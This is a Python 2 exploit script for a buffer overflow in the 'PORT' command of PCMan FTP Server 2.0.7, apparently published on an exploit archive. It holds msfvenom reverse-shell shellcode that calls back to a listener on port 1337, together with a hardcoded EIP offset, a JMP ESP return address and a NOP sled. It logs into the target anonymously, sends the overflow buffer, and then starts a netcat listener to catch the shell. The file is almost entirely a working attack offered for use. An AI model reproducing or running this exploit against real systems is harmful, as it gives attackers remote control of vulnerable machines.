#!/usr/bin/env python
#---------------------------------------------------------------------------------------------#
# Software      = PCMan FTP Server 2.0.7 - 'PORT'                                             #
# Download Link = https://www.exploit-db.com/apps/9fceb6fefd0f3ca1a8c36e97b6cc925d-PCMan.7z   #
# Date          = 9/19/2017                                                                   #
# Reference     = https://www.exploit-db.com/exploits/26471/                                  #
# Author        = @ihack4falafel                                                              #
# Tested on     = Windows XP SP3 - Professional                                               #
# EIP Offset    = 2007                                                                        #
# Badchars      = "\x00\x0A\x0D"                                                              #
# RET Address   = 0x7cbd51fb : "\xFF\xE4" | [SHELL32.dll]                                     #
# Usage         = python exploit.py <target IP>                                               #        
#---------------------------------------------------------------------------------------------#

import sys
import socket
import struct
import time
import subprocess

#---------------#---------#  
W  = '\033[0m'  # White   #
R  = '\033[31m' # Red     #
G  = '\033[32m' # Green   #
O  = '\033[33m' # Orange  #
B  = '\033[34m' # Blue    #
P  = '\033[35m' # Purple  #
C  = '\033[36m' # Cyan    #
M  = '\033[35m' # Magenta #
Y  = '\033[33m' # Yellow  #
#---------------#---------#


if len(sys.argv) < 2:
  print Y+ "Usage               :" + P+  " python exploit.py <target IP>"    +W
  print Y+ "Example             :" + P+  " python exploit.py 127.0.0.1 0"    +W
  sys.exit(0)

HOST     = sys.argv[1]

#---------------------------------------------------------------------------------------------------------------#
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.199.129 LPORT=1337 -b "\x00\x0A\x0D" -f python -v payload #
#---------------------------------------------------------------------------------------------------------------#

payload =  ""
payload += "\xdb\xc4\xd9\x74\x24\xf4\x5d\xb8\x20\xf9\xbe\xa0"
payload += "\x29\xc9\xb1\x52\x31\x45\x17\x03\x45\x17\x83\xcd"
payload += "\x05\x5c\x55\xf1\x1e\x23\x96\x09\xdf\x44\x1e\xec"
payload += "\xee\x44\x44\x65\x40\x75\x0e\x2b\x6d\xfe\x42\xdf"
payload += "\xe6\x72\x4b\xd0\x4f\x38\xad\xdf\x50\x11\x8d\x7e"
payload += "\xd3\x68\xc2\xa0\xea\xa2\x17\xa1\x2b\xde\xda\xf3"
payload += "\xe4\x94\x49\xe3\x81\xe1\x51\x88\xda\xe4\xd1\x6d"
payload += "\xaa\x07\xf3\x20\xa0\x51\xd3\xc3\x65\xea\x5a\xdb"
payload += "\x6a\xd7\x15\x50\x58\xa3\xa7\xb0\x90\x4c\x0b\xfd"
payload += "\x1c\xbf\x55\x3a\x9a\x20\x20\x32\xd8\xdd\x33\x81"
payload += "\xa2\x39\xb1\x11\x04\xc9\x61\xfd\xb4\x1e\xf7\x76"
payload += "\xba\xeb\x73\xd0\xdf\xea\x50\x6b\xdb\x67\x57\xbb"
payload += "\x6d\x33\x7c\x1f\x35\xe7\x1d\x06\x93\x46\x21\x58"
payload += "\x7c\x36\x87\x13\x91\x23\xba\x7e\xfe\x80\xf7\x80"
payload += "\xfe\x8e\x80\xf3\xcc\x11\x3b\x9b\x7c\xd9\xe5\x5c"
payload += "\x82\xf0\x52\xf2\x7d\xfb\xa2\xdb\xb9\xaf\xf2\x73"
payload += "\x6b\xd0\x98\x83\x94\x05\x0e\xd3\x3a\xf6\xef\x83"
payload += "\xfa\xa6\x87\xc9\xf4\x99\xb8\xf2\xde\xb1\x53\x09"
payload += "\x89\x7d\x0b\xd6\xc8\x16\x4e\xd8\xcf\xdf\xc7\x3e"
payload += "\xa5\x0f\x8e\xe9\x52\xa9\x8b\x61\xc2\x36\x06\x0c"
payload += "\xc4\xbd\xa5\xf1\x8b\x35\xc3\xe1\x7c\xb6\x9e\x5b"
payload += "\x2a\xc9\x34\xf3\xb0\x58\xd3\x03\xbe\x40\x4c\x54"
payload += "\x97\xb7\x85\x30\x05\xe1\x3f\x26\xd4\x77\x07\xe2"
payload += "\x03\x44\x86\xeb\xc6\xf0\xac\xfb\x1e\xf8\xe8\xaf"
payload += "\xce\xaf\xa6\x19\xa9\x19\x09\xf3\x63\xf5\xc3\x93"
payload += "\xf2\x35\xd4\xe5\xfa\x13\xa2\x09\x4a\xca\xf3\x36"
payload += "\x63\x9a\xf3\x4f\x99\x3a\xfb\x9a\x19\x4a\xb6\x86"
payload += "\x08\xc3\x1f\x53\x09\x8e\x9f\x8e\x4e\xb7\x23\x3a"
payload += "\x2f\x4c\x3b\x4f\x2a\x08\xfb\xbc\x46\x01\x6e\xc2"
payload += "\xf5\x22\xbb"

#----------------------------#
#      Buffer Structure      #
#----------------------------#
# buffer = AAA...........AAA #
# buffer = EIP               #
# buffer = NOPSled           #
# buffer = payload           #
# buffer = BBB...........BBB #
#----------------------------#

buffer =  "A" * 2007
buffer += struct.pack('<L', 0x7cbd51fb)
buffer += "\x90" * 40
buffer += payload
buffer += "B" * (3500-2007-4-40-len(payload))

try:

  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((HOST, 21))
  print G+ "[+]" +W + " Connected to PCMan FTP Server with IP: %s and port: 21" %(HOST)
  print G+ "[+]" +W + " Sending %s bytes of evil payload" %len(buffer)
  time.sleep(2)
  s.send('USER anonymous\r\n')
  s.recv(1024)
  s.send('PASS anonymous\r\n')
  s.recv(1024)
  s.send('PORT' + buffer + '\r\n')
  s.close()
  print G+ "[+]" + P+ " Incoming shell" + Y+ " <(^,^)>" +W
  subprocess.call(['nc -lnvp 1337'], shell=True)

except Exception,msg:

  print R+ "[-]" + P+ " Could not connect to PCMan FTP Server" + Y+ " (._.)" +W
  sys.exit(0)

